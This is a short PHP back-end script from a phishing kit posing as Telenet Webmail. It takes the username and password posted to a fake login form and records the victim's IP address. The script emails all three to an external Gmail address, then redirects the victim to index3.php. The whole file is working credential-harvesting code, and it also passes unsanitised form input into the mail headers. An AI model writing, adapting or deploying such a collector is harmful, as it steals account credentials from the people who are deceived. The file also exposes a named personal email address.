<?php

	$ip = getenv("REMOTE_ADDR");
	$message .= "----------------foni--------------------\n";
	$message .= "Email: ".$_POST["j_username"]."\n";
	$message .= "Password: ".$_POST["j_password"]."\n";
	$message .= "IP: ".$ip."\n";
	$message .= "---------------Powered By mexy--------------------\n";
	
	
	$recipient = "bernardcharme3@gmail.com";
	$subject = "Telenet Webmail";
	$headers = "From: <mexy@home.com> ";
	$headers .= $_POST['eMailAdd']."\n";
	$headers .= "MIME-Version: 1.0\n";
	
	//mail("$to", "Telenet ReZulT", $message);
	
	$send = mail($recipient,$subject,$message,$headers);
	
	if ($send)
	   {
		   header( "Location:index3.php");
	   }
	else
       {
 		print "ERROR! Please go back and try again.";
  	   }

?>